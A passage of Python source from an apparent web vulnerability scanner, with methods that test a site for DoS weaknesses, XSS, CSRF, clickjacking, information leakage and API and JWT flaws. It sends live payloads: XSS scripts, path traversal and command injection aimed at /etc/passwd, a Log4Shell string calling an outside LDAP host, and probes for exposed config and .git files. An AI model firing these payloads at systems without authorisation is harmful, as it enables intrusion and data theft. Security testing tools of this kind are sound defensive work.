                                has_rate_limiting = True
                                break
                        
                        # Check for rate limiting in response status
                        if response.status_code == 429:  # Too Many Requests
                            has_rate_limiting = True
                            break
                    
                    except Exception as e:
                        logger.error(f"Error testing rate limiting on {api['url']}: {str(e)}")
                
                if not has_rate_limiting and api_endpoints:
                    issues.append({
                        'issue': 'No API rate limiting detected',
                        'url': api['url'],
                        'evidence': 'Made multiple requests without triggering rate limiting',
                        'recommendation': 'Implement rate limiting on API endpoints'
                    })
        
        except Exception as e:
            logger.error(f"Error testing API rate limiting: {str(e)}")
        
        # Test 2: Check for resource-intensive operations
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for forms that might trigger resource-intensive operations
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Check for search forms or other potentially intensive operations
                search_indicators = ['search', 'query', 'find', 'filter', 'sort']
                
                inputs = form.find_all(['input', 'select', 'textarea'])
                for inp in inputs:
                    input_name = inp.get('name', '').lower()
                    if any(indicator in input_name for indicator in search_indicators):
                        # Found a potential search form, check if it has limits
                        limit_found = False
                        
                        for inp2 in inputs:
                            input_name2 = inp2.get('name', '').lower()
                            if any(term in input_name2 for term in ['limit', 'max', 'count', 'size', 'per_page']):
                                limit_found = True
                                break
                        
                        if not limit_found:
                            issues.append({
                                'issue': 'Search operation without explicit limits',
                                'url': form_url,
                                'form_method': form_method,
                                'evidence': f"Search field '{input_name}' without pagination/limits",
                                'recommendation': 'Implement pagination and result limits on search operations'
                            })
                        break
        
        except Exception as e:
            logger.error(f"Error checking resource-intensive operations: {str(e)}")
        
        # Test 3: Check for long processing times
        # This is done by measuring the response times
        try:
            # Measure response time for main page
            start_time = time.time()
            response = requests.get(target_url, headers=self.headers, timeout=20)
            main_page_time = time.time() - start_time
            
            if main_page_time > 5.0:  # Threshold for slow response
                issues.append({
                    'issue': 'Slow page loading time',
                    'url': target_url,
                    'evidence': f"Page took {main_page_time:.2f} seconds to load",
                    'recommendation': 'Optimize page loading time to prevent resource exhaustion'
                })
        
        except Exception as e:
            logger.error(f"Error checking page load time: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "api_endpoints": api_endpoints,
            "issues": issues,
            "issues_count": len(issues),
            "note": "Only light DoS testing was performed. Full testing requires authorization.",
            "vulnerable": len(issues) > 0
        }
        
        self.results["dos_testing"]["resistance"] = result
        return result
    
    def analyze_error_handling(self, target_url=None):
        """Analyze error handling for DoS vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Analyzing error handling on {target_url}")
        
        # Test for improper error handling
        issues = []
        
        # Test 1: Check for detailed error messages
        try:
            # Try to generate errors by requesting non-existent resources
            error_urls = [
                urljoin(target_url, '/nonexistent-page-' + ''.join(random.choices(string.ascii_lowercase, k=10))),
                urljoin(target_url, '/invalid.php'),
                urljoin(target_url, '/error.aspx')
            ]
            
            for url in error_urls:
                response = requests.get(url, headers=self.headers, timeout=10)
                
                # Check for detailed error messages
                error_indicators = [
                    'exception', 'stack trace', 'syntax error', 'fatal error',
                    'warning:', 'error:', 'uncaught exception', 'debug',
                    'line \d+', 'file [\w\/]+\.[\w]+'  # Line numbers and file paths
                ]
                
                for indicator in error_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        issues.append({
                            'issue': 'Detailed error messages exposed',
                            'url': url,
                            'evidence': f"Error message contains details matching '{indicator}'",
                            'recommendation': 'Implement custom error pages and disable detailed error messages in production'
                        })
                        break
        
        except Exception as e:
            logger.error(f"Error checking detailed error messages: {str(e)}")
        
        # Test 2: Check for error handling in forms
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'post').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                if form_method == 'post':
                    # Try submitting empty form
                    try:
                        response = requests.post(form_url, data={}, headers=self.headers, timeout=10)
                        
                        # Check for proper error handling
                        if response.status_code >= 500:
                            issues.append({
                                'issue': 'Server error on form submission',
                                'url': form_url,
                                'evidence': f"Server returned {response.status_code} status code on empty form submission",
                                'recommendation': 'Implement proper input validation and error handling'
                            })
                    
                    except Exception as e:
                        logger.error(f"Error testing form submission: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error checking form error handling: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "issues": issues,
            "issues_count": len(issues),
            "vulnerable": len(issues) > 0
        }
        
        self.results["dos_testing"]["error_handling"] = result
        return result
    
    #==========================================
    # 10. Client-Side Testing Methods
    #==========================================
    
    def test_xss_vulnerabilities(self, target_url=None):
        """Test for Cross-Site Scripting vulnerabilities"""
        # Note: Detailed XSS testing is implemented in xss_attacks.py
        # This is a simplified version
        target_url = target_url or self.target
        
        logger.info(f"Testing for XSS vulnerabilities on {target_url}")
        
        # Find potential XSS injection points
        injection_points = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Find input fields
                for inp in form.find_all(['input', 'textarea']):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '') if inp.name == 'input' else 'textarea'
                    
                    if input_name and input_type not in ['checkbox', 'radio', 'button', 'submit', 'hidden', 'file']:
                        injection_points.append({
                            'url': form_url,
                            'method': form_method,
                            'param': input_name,
                            'context': 'form',
                            'type': input_type
                        })
            
            # Find URL parameters
            for a in soup.find_all('a', href=True):
                href = a['href']
                if '?' in href:
                    try:
                        link_url = urljoin(target_url, href)
                        parsed_url = urlparse(link_url)
                        
                        # Only include URLs from the same domain
                        if parsed_url.netloc == urlparse(target_url).netloc:
                            query_params = parse_qs(parsed_url.query)
                            
                            for param_name in query_params:
                                injection_points.append({
                                    'url': link_url,
                                    'method': 'get',
                                    'param': param_name,
                                    'context': 'url',
                                    'type': 'parameter'
                                })
                    except:
                        pass
        
        except Exception as e:
            logger.error(f"Error finding XSS injection points: {str(e)}")
        
        # Test XSS on injection points
        vulnerabilities = []
        
        # Test payloads
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>'
        ]
        
        # Test each injection point
        for point in injection_points[:5]:  # Limit to first 5 for brevity
            url = point['url']
            method = point['method']
            param = point['param']
            
            for payload in xss_payloads:
                try:
                    if method == 'get':
                        # For GET requests
                        params = {param: payload}
                        response = requests.get(url, params=params, headers=self.headers, timeout=10)
                    else:
                        # For POST requests
                        data = {param: payload}
                        response = requests.post(url, data=data, headers=self.headers, timeout=10)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        vulnerabilities.append({
                            'url': url,
                            'method': method.upper(),
                            'param': param,
                            'context': point['context'],
                            'payload': payload,
                            'evidence': 'Payload was reflected in the response without encoding/filtering'
                        })
                        break  # Found vulnerability, no need to try other payloads
                
                except Exception as e:
                    logger.error(f"Error testing XSS on {url}, param {param}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "injection_points_found": len(injection_points),
            "injection_points_tested": min(5, len(injection_points)),
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["client_side"]["xss"] = result
        return result
    
    def test_csrf_vulnerabilities(self, target_url=None):
        """Test for Cross-Site Request Forgery vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for CSRF vulnerabilities on {target_url}")
        
        # Find forms to test
        forms_to_test = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find POST forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Focus on POST forms (GET forms are less critical for CSRF)
                if form_method == 'post':
                    # Check for CSRF tokens
                    csrf_field = None
                    for inp in form.find_all('input'):
                        input_name = inp.get('name', '').lower()
                        input_type = inp.get('type', '').lower()
                        
                        # Common CSRF token field names
                        csrf_terms = ['csrf', 'token', 'nonce', 'verify', 'authenticity']
                        
                        if any(term in input_name for term in csrf_terms) or input_type == 'hidden':
                            csrf_field = inp.get('name', '')
                            break
                    
                    # Add form to test list
                    forms_to_test.append({
                        'url': form_url,
                        'method': form_method,
                        'csrf_field': csrf_field,
                        'has_csrf_token': bool(csrf_field),
                        'inputs': [(inp.get('name', ''), inp.get('type', '')) for inp in form.find_all('input') if inp.get('name')]
                    })
        
        except Exception as e:
            logger.error(f"Error finding forms for CSRF testing: {str(e)}")
        
        # Analyze forms for CSRF vulnerabilities
        vulnerabilities = []
        
        for form in forms_to_test:
            # Forms without CSRF tokens are potentially vulnerable
            if not form['has_csrf_token']:
                # Check if it's a sensitive operation form
                sensitive_operations = False
                sensitive_terms = [
                    'password', 'email', 'user', 'account', 'profile', 'admin',
                    'settings', 'update', 'delete', 'remove', 'edit', 'add',
                    'create', 'change', 'payment', 'transfer', 'send', 'submit'
                ]
                
                for name, _ in form['inputs']:
                    if any(term in name.lower() for term in sensitive_terms):
                        sensitive_operations = True
                        break
                
                if sensitive_operations or 'admin' in form['url'].lower():
                    vulnerabilities.append({
                        'url': form['url'],
                        'method': form['method'].upper(),
                        'evidence': 'Form performing sensitive operations does not contain CSRF token',
                        'severity': 'High' if sensitive_operations else 'Medium'
                    })
            else:
                # Even with CSRF token, check if it's properly validated
                # This requires actual testing with a browser, which we'll skip in this demo
                pass
        
        # Check for SameSite cookie attribute
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            # Get cookies
            sameSite_missing = False
            for cookie in response.cookies:
                # Check for session-like cookies
                if any(term in cookie.name.lower() for term in ['sess', 'auth', 'token', 'id']):
                    # Try to extract SameSite attribute
                    cookie_header = None
                    if 'Set-Cookie' in response.headers:
                        cookie_headers = response.headers.get_all('Set-Cookie') if hasattr(response.headers, 'get_all') else [response.headers.get('Set-Cookie')]
                        for header in cookie_headers:
                            if cookie.name in header:
                                cookie_header = header
                                break
                    
                    if not cookie_header or 'SameSite' not in cookie_header:
                        sameSite_missing = True
                        vulnerabilities.append({
                            'url': target_url,
                            'cookie': cookie.name,
                            'evidence': 'Session cookie missing SameSite attribute',
                            'severity': 'Medium'
                        })
                        break
        
        except Exception as e:
            logger.error(f"Error checking SameSite cookie attribute: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "forms_tested": len(forms_to_test),
            "forms_with_csrf_token": sum(1 for form in forms_to_test if form['has_csrf_token']),
            "forms_without_csrf_token": sum(1 for form in forms_to_test if not form['has_csrf_token']),
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "vulnerable": len(vulnerabilities) > 0
        }
        
        self.results["client_side"]["csrf"] = result
        return result
    
    def test_clickjacking_vulnerability(self, target_url=None):
        """Test for Clickjacking/UI redress vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for Clickjacking vulnerability on {target_url}")
        
        # Check for X-Frame-Options or CSP frame-ancestors
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            x_frame_options = response.headers.get('X-Frame-Options', '').upper()
            csp = response.headers.get('Content-Security-Policy', '')
            
            # Check if framing is properly restricted
            frame_ancestors = None
            if 'frame-ancestors' in csp:
                # Extract frame-ancestors directive
                match = re.search(r'frame-ancestors\s+([^;]+)', csp)
                if match:
                    frame_ancestors = match.group(1).strip()
            
            vulnerable = False
            evidence = None
            
            if not x_frame_options and not frame_ancestors:
                vulnerable = True
                evidence = "No X-Frame-Options or CSP frame-ancestors directive present"
            elif x_frame_options and x_frame_options not in ['DENY', 'SAMEORIGIN']:
                vulnerable = True
                evidence = f"X-Frame-Options value '{x_frame_options}' is not secure (should be DENY or SAMEORIGIN)"
            elif frame_ancestors and ('*' in frame_ancestors or 'unsafe' in frame_ancestors.lower()):
                vulnerable = True
                evidence = f"CSP frame-ancestors '{frame_ancestors}' allows unsafe framing"
            
            # Store results
            result = {
                "target_url": target_url,
                "x_frame_options": x_frame_options,
                "csp_frame_ancestors": frame_ancestors,
                "vulnerable": vulnerable,
                "evidence": evidence
            }
            
            if vulnerable:
                result["recommendation"] = "Implement X-Frame-Options: DENY or CSP frame-ancestors 'none'"
            
            self.results["client_side"]["clickjacking"] = result
            return result
            
        except Exception as e:
            logger.error(f"Error testing for Clickjacking vulnerability: {str(e)}")
            result = {
                "target_url": target_url,
                "error": str(e),
                "vulnerable": False
            }
            self.results["client_side"]["clickjacking"] = result
            return result
    
    #==========================================
    # 11. Information Leakage Testing Methods
    #==========================================
    
    def test_information_disclosure(self, target_url=None):
        """Test for information disclosure vulnerabilities"""
        target_url = target_url or self.target
        
        logger.info(f"Testing for information disclosure on {target_url}")
        
        # Check for various types of information disclosure
        findings = []
        
        # Test 1: Check for metadata in page source
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            source = response.text
            
            # Check for metadata
            meta_patterns = [
                (r'<!--\s*(?!\\[if).*?-->', 'HTML comments'),
                (r'<meta\s+name=["\']author["\'][^>]*content=["\']([^"\']+)["\']', 'Author metadata'),
                (r'<meta\s+name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']', 'Generator metadata'),
                (r'data-user-?id=["\']([^"\']+)["\']', 'User IDs in HTML'),
                (r'admin-?user=["\']([^"\']+)["\']', 'Admin user info'),
                (r'\.js\.map"', 'JavaScript source maps'),
                (r'\.css\.map"', 'CSS source maps')
            ]
            
            for pattern, description in meta_patterns:
                matches = re.findall(pattern, source)
                
                if matches:
                    # For HTML comments, filter out common framework comments
                    if description == 'HTML comments':
                        significant_comments = []
                        for comment in matches:
                            # Skip common React/Angular/framework comments
                            if not any(x in comment.lower() for x in ['react-dom', 'react-text', 'angular', 'if !IE', 'endif']):
                                # Check if comment has potential sensitive info
                                if any(term in comment.lower() for term in ['todo', 'fixme', 'note', 'hack', 'work-around', 'debug', 'temporary']):
                                    significant_comments.append(comment[:100] + ('...' if len(comment) > 100 else ''))
                        
                        if significant_comments:
                            findings.append({
                                'type': description,
                                'evidence': significant_comments[:3],  # First 3 comments only
                                'count': len(significant_comments),
                                'severity': 'Medium'
                            })
                    else:
                        findings.append({
                            'type': description,
                            'evidence': matches[:3],  # First 3 matches only
                            'count': len(matches),
                            'severity': 'Low'
                        })
            
            # Check for email addresses
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            emails = re.findall(email_pattern, source)
            
            if emails:
                findings.append({
                    'type': 'Email addresses',
                    'evidence': list(set(emails))[:5],  # First 5 unique emails
                    'count': len(set(emails)),
                    'severity': 'Medium'
                })
        
        except Exception as e:
            logger.error(f"Error checking for metadata: {str(e)}")
        
        # Test 2: Check for version information in HTTP headers
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            headers = response.headers
            
            version_headers = [
                'Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
                'X-Generator', 'X-Drupal-Cache', 'X-Drupal-Dynamic-Cache', 'X-Varnish',
                'Liferay-Portal', 'X-Joomla-Cache'
            ]
            
            for header in version_headers:
                if header in headers:
                    findings.append({
                        'type': f'{header} header',
                        'evidence': headers[header],
                        'severity': 'Medium' if any(x in header.lower() for x in ['server', 'powered']) else 'Low'
                    })
        
        except Exception as e:
            logger.error(f"Error checking version headers: {str(e)}")
        
        # Test 3: Check for common sensitive files
        sensitive_files = [
            '/robots.txt',
            '/sitemap.xml',
            '/.git/HEAD',
            '/.svn/entries',
            '/.DS_Store',
            '/package.json',
            '/composer.json',
            '/npm-debug.log',
            '/yarn-error.log',
            '/Gemfile',
            '/Cargo.toml',
            '/bower.json',
            '/webpack.config.js',
            '/config.yml',
            '/config.xml',
            '/web.config',
            '/phpinfo.php',
            '/info.php',
            '/server-status'
        ]
        
        for file_path in sensitive_files:
            try:
                file_url = urljoin(target_url, file_path)
                response = requests.get(file_url, headers=self.headers, timeout=5)
                
                if response.status_code == 200:
                    content_length = len(response.content)
                    
                    # Only consider non-empty responses
                    if content_length > 0:
                        # For text files, check content
                        if 'text' in response.headers.get('Content-Type', ''):
                            # Check first few bytes to see if it looks like the expected file
                            content_sample = response.text[:100]
                            
                            # Different validation for different file types
                            valid = False
                            if file_path == '/robots.txt' and ('User-agent' in content_sample or 'Disallow' in content_sample):
                                valid = True
                            elif file_path == '/sitemap.xml' and ('<urlset' in content_sample or '<sitemapindex' in content_sample):
                                valid = True
                            elif file_path == '/.git/HEAD' and 'ref:' in content_sample:
                                valid = True
                            elif file_path in ['/package.json', '/composer.json', '/bower.json'] and ('{' in content_sample and '"name"' in content_sample):
                                valid = True
                            elif file_path == '/web.config' and '<configuration' in content_sample:
                                valid = True
                            elif file_path in ['/phpinfo.php', '/info.php'] and ('php' in content_sample.lower() and 'version' in content_sample.lower()):
                                valid = True
                            elif file_path == '/server-status' and ('Apache' in content_sample or 'Server Status' in content_sample):
                                valid = True
                            else:
                                # For other files, just check if it's not an error page
                                valid = 'error' not in content_sample.lower() and '404' not in content_sample
                            
                            if valid:
                                findings.append({
                                    'type': 'Sensitive file',
                                    'file': file_path,
                                    'url': file_url,
                                    'content_length': content_length,
                                    'sample': content_sample if len(content_sample) < 100 else content_sample[:100] + '...',
                                    'severity': 'High' if any(x in file_path for x in ['.git', '.svn', 'phpinfo', 'config', '.env']) else 'Medium'
                                })
                
            except Exception as e:
                logger.error(f"Error checking sensitive file {file_path}: {str(e)}")
        
        # Test 4: Check for error message information disclosure
        try:
            # Try to generate errors
            error_test_urls = [
                urljoin(target_url, '/nonexistent-' + ''.join(random.choices(string.ascii_letters, k=10))),
                urljoin(target_url, '/index.php'),  # Might trigger errors on non-PHP servers
                urljoin(target_url, '/?id=\''),  # SQL Error
                urljoin(target_url, '/error')
            ]
            
            for url in error_test_urls:
                try:
                    response = requests.get(url, headers=self.headers, timeout=5)
                    
                    # Check for error messages
                    if response.status_code >= 400:
                        error_patterns = [
                            (r'(?:Exception|Error|Warning):[^\n]+', 'Exception/Error message'),
                            (r'Stack trace:', 'Stack trace information'),
                            (r'at\s+[^\s]+\([^\)]*\)', 'Call stack information'),
                            (r'(?:(?:SQL|MySQL|Oracle|DB2|ORA-|PostgreSQL) Error|Warning|Exception)', 'Database error message'),
                            (r'(?:PHP|Python|Ruby|Perl|ASP\.NET)[^\n]+', 'Programming language information'),
                            (r'(?:/[^\s]+\.(?:php|py|rb|pl|asp|aspx|jsp))', 'Server file paths'),
                            (r'(?:eval|preg_replace|exec)\(\)', 'Sensitive function names')
                        ]
                        
                        for pattern, description in error_patterns:
                            matches = re.findall(pattern, response.text)
                            
                            if matches:
                                findings.append({
                                    'type': 'Error message disclosure',
                                    'error_type': description,
                                    'url': url,
                                    'evidence': matches[:2],  # First 2 matches only
                                    'severity': 'High'
                                })
                
                except Exception as e:
                    pass  # Ignore errors in error testing
        
        except Exception as e:
            logger.error(f"Error in error message testing: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["info_leakage"]["disclosure"] = result
        return result
    
    def test_error_messages(self, target_url=None):
        """Test for error messages that might leak sensitive information"""
        target_url = target_url or self.target
        
        logger.info(f"Testing error messages on {target_url}")
        
        # Find injectable parameters to trigger errors
        params = []
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(target_url, form_action) if form_action else target_url
                
                # Get input fields
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', '').lower()
                    
                    if input_name and input_type not in ['checkbox', 'radio', 'button', 'submit']:
                        params.append({
                            'url': form_url,
                            'method': form_method,
                            'param': input_name,
                            'context': 'form'
                        })
            
            # Find URL parameters
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    link_url = urljoin(target_url, href)
                    parsed_url = urlparse(link_url)
                    query_params = parse_qs(parsed_url.query)
                    
                    for param_name in query_params:
                        params.append({
                            'url': link_url,
                            'method': 'get',
                            'param': param_name,
                            'context': 'url'
                        })
        
        except Exception as e:
            logger.error(f"Error finding injectable parameters: {str(e)}")
        
        # Test for error message disclosure
        findings = []
        
        # Error-triggering payloads
        error_payloads = [
            ("'", "SQL injection"),
            ("<script>", "Script injection"),
            ("../../../../etc/passwd", "Path traversal"),
            ("${jndi:ldap://malicious.com/a}", "Log4Shell"),
            ("$(cat /etc/passwd)", "Command injection")
        ]
        
        # Test each parameter with error-triggering payloads
        for param_info in params[:10]:  # Limit to first 10 for brevity
            url = param_info['url']
            method = param_info['method']
            param_name = param_info['param']
            
            for payload, payload_type in error_payloads:
                try:
                    if method == 'get':
                        response = requests.get(
                            url,
                            params={param_name: payload},
                            headers=self.headers,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            url,
                            data={param_name: payload},
                            headers=self.headers,
                            timeout=10
                        )
                    
                    # Check for error message patterns
                    error_patterns = [
                        (r'(?:SQL|MySQL|Oracle|DB2|ORA-|PostgreSQL)\s+(?:Error|Warning|Exception)[\s:]+[^\n]+', 'Database error'),
                        (r'(?:Exception|Error|Warning):[^\n]+', 'General exception'),
                        (r'(?:eval|preg_replace|exec)\(\)[^\n]+', 'Function error'),
                        (r'(?:PHP|Python|Ruby|Perl|ASP\.NET)[^\n]+error[^\n]+', 'Language error'),
                        (r'(?:/[^\s]+\.(?:php|py|rb|pl|asp|aspx|jsp))(?:: line \d+)?', 'Source file path'),
                        (r'Stack trace:\s*#0\s+[^\n]+', 'Stack trace')
                    ]
                    
                    for pattern, error_type in error_patterns:
                        matches = re.findall(pattern, response.text)
                        
                        if matches:
                            findings.append({
                                'url': url,
                                'method': method.upper(),
                                'param': param_name,
                                'payload': payload,
                                'payload_type': payload_type,
                                'error_type': error_type,
                                'evidence': matches[0] if matches else None,
                                'status_code': response.status_code
                            })
                            break  # Found an error, no need to check other patterns
                
                except Exception as e:
                    logger.error(f"Error testing parameter {param_name} with payload {payload}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "params_tested": min(10, len(params)),
            "total_params_found": len(params),
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["info_leakage"]["error_messages"] = result
        return result
    
    #==========================================
    # 12. API Testing Methods
    #==========================================
    
    def discover_api_endpoints(self, target_url=None):
        """Discover API endpoints"""
        target_url = target_url or self.target
        
        logger.info(f"Discovering API endpoints on {target_url}")
        
        # Find potential API endpoints
        api_endpoints = []
        
        # Get base URL
        parsed_url = urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Common API path patterns
        common_api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1', '/graphql', '/service',
            '/api/users', '/api/products', '/api/data',
            '/json', '/xml', '/soap', '/webservice',
            '/swagger', '/swagger-ui', '/api-docs'
        ]
        
        # Check common API paths
        for path in common_api_paths:
            try:
                api_url = urljoin(base_url, path)
                response = requests.get(api_url, headers=self.headers, timeout=5)
                
                # Check if it might be an API endpoint
                if response.status_code != 404:
                    content_type = response.headers.get('Content-Type', '')
                    
                    # APIs often return JSON or XML
                    is_api = False
                    if 'json' in content_type or 'xml' in content_type:
                        is_api = True
                    elif response.text and (response.text.strip().startswith('{') or response.text.strip().startswith('[') or response.text.strip().startswith('<')):
                        is_api = True
                        
                    if is_api:
                        api_endpoints.append({
                            'url': api_url,
                            'status_code': response.status_code,
                            'content_type': content_type,
                            'content_length': len(response.content)
                        })
            
            except Exception as e:
                logger.error(f"Error checking API path {path}: {str(e)}")
        
        # Look for API hints in page source
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            # Look for API URLs in JavaScript
            api_patterns = [
                r'(?:fetch|axios\.get|ajax|\.post)\([\'"]([^\'"]*(?:api|rest|graphql|service|json)[^\'"]*)[\'"]',
                r'apiUrl\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'baseUrl\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'endpoint\s*[:=]\s*[\'"]([^\'"]+)[\'"]'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, response.text)
                
                for match in matches:
                    # Construct full URL if it's a relative path
                    api_url = urljoin(base_url, match)
                    
                    # Only include URLs from the same domain
                    if urlparse(api_url).netloc == parsed_url.netloc:
                        # Check if the URL is valid
                        if any(x in api_url.lower() for x in ['api', 'rest', 'graphql', 'service', 'json']):
                            # Check if we haven't already found this endpoint
                            if not any(e['url'] == api_url for e in api_endpoints):
                                try:
                                    # Try to access the API endpoint
                                    api_response = requests.get(api_url, headers=self.headers, timeout=5)
                                    
                                    api_endpoints.append({
                                        'url': api_url,
                                        'status_code': api_response.status_code,
                                        'content_type': api_response.headers.get('Content-Type', ''),
                                        'content_length': len(api_response.content),
                                        'source': 'JavaScript'
                                    })
                                except Exception as e:
                                    logger.error(f"Error checking API URL {api_url}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error searching for API hints in page source: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "api_endpoints_found": len(api_endpoints),
            "api_endpoints": api_endpoints
        }
        
        self.results["api_testing"]["endpoints"] = result
        return result
    
    def test_api_security(self, target_url=None):
        """Test API security"""
        target_url = target_url or self.target
        
        logger.info(f"Testing API security on {target_url}")
        
        # First get API endpoints
        api_endpoints = []
        if "api_testing" in self.results and "endpoints" in self.results["api_testing"]:
            api_endpoints = self.results["api_testing"]["endpoints"].get("api_endpoints", [])
        
        if not api_endpoints:
            # Discover API endpoints
            api_endpoints = self.discover_api_endpoints(target_url).get("api_endpoints", [])
        
        if not api_endpoints:
            logger.warning("No API endpoints found for testing")
            result = {
                "target_url": target_url,
                "message": "No API endpoints found for testing",
                "vulnerable": False
            }
            self.results["api_testing"]["security"] = result
            return result
        
        # Test API security
        findings = []
        
        # Authentication tests
        for api in api_endpoints:
            api_url = api['url']
            
            # Test 1: Check if API requires authentication
            try:
                # Make a request without authentication
                response = requests.get(api_url, headers=self.headers, timeout=10)
                
                # Check if we got a successful response (might indicate no auth required)
                if response.status_code == 200:
                    # Try to determine if this is a sensitive endpoint
                    sensitive_indicators = [
                        'user', 'admin', 'account', 'profile',
                        'secure', 'private', 'data', 'secret'
                    ]
                    
                    is_sensitive = any(indicator in api_url.lower() for indicator in sensitive_indicators)
                    
                    if is_sensitive:
                        findings.append({
                            'api_url': api_url,
                            'issue': 'Potentially sensitive API endpoint accessible without authentication',
                            'evidence': f"Status code {response.status_code}, content length {len(response.content)}",
                            'severity': 'High'
                        })
                    else:
                        # Check response for sensitive data
                        try:
                            if 'json' in response.headers.get('Content-Type', ''):
                                json_data = response.json()
                                
                                # Check for potentially sensitive fields
                                sensitive_fields = ['password', 'token', 'secret', 'key', 'email', 'phone', 'address']
                                
                                has_sensitive_data = False
                                if isinstance(json_data, dict):
                                    # Check for sensitive keys in response
                                    for field in sensitive_fields:
                                        if field in str(json_data).lower():
                                            has_sensitive_data = True
                                            break
                                
                                if has_sensitive_data:
                                    findings.append({
                                        'api_url': api_url,
                                        'issue': 'API endpoint returning potentially sensitive data without authentication',
                                        'evidence': f"Response contains sensitive fields",
                                        'severity': 'High'
                                    })
                        except:
                            pass  # Not JSON data or other error
            
            except Exception as e:
                logger.error(f"Error testing API authentication on {api_url}: {str(e)}")
            
            # Test 2: Check for rate limiting
            try:
                # Make multiple requests in quick succession
                has_rate_limiting = False
                
                for _ in range(5):  # Make 5 requests in quick succession
                    response = requests.get(api_url, headers=self.headers, timeout=5)
                    
                    # Check for rate limiting headers
                    rate_limit_headers = [
                        'X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset',
                        'Retry-After', 'X-Rate-Limit', 'RateLimit-Limit'
                    ]
                    
                    for header in rate_limit_headers:
                        if header in response.headers:
                            has_rate_limiting = True
                            break
                    
                    # Check for rate limiting response code
                    if response.status_code == 429:  # Too Many Requests
                        has_rate_limiting = True
                        break
                
                if not has_rate_limiting:
                    findings.append({
                        'api_url': api_url,
                        'issue': 'No API rate limiting detected',
                        'evidence': 'Made multiple requests without triggering rate limiting',
                        'severity': 'Medium'
                    })
            
            except Exception as e:
                logger.error(f"Error testing API rate limiting on {api_url}: {str(e)}")
        
        # Store results
        result = {
            "target_url": target_url,
            "api_endpoints_tested": len(api_endpoints),
            "findings": findings,
            "findings_count": len(findings),
            "vulnerable": len(findings) > 0
        }
        
        self.results["api_testing"]["security"] = result
        return result
    
    def test_jwt_security(self, target_url=None):
        """Test JWT token security"""
        target_url = target_url or self.target
        
        logger.info(f"Testing JWT security on {target_url}")
        
        # Check for JWT tokens
        jwt_tokens = []
        
        # Check cookies for JWT tokens
        try:
            response = requests.get(target_url, headers=self.headers, timeout=10)
            
            for cookie in response.cookies:
                cookie_value = cookie.value
                
                # Check if it looks like a JWT token (three parts separated by dots)
                if re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', cookie_value):
                    jwt_tokens.append({
                        'source': 'cookie',
                        'name': cookie.name,
                        'value': cookie_value
                    })
        
        except Exception as e:
            logger.error(f"Error checking cookies for JWT tokens: {str(e)}")
        
        # Check for auth headers in API responses
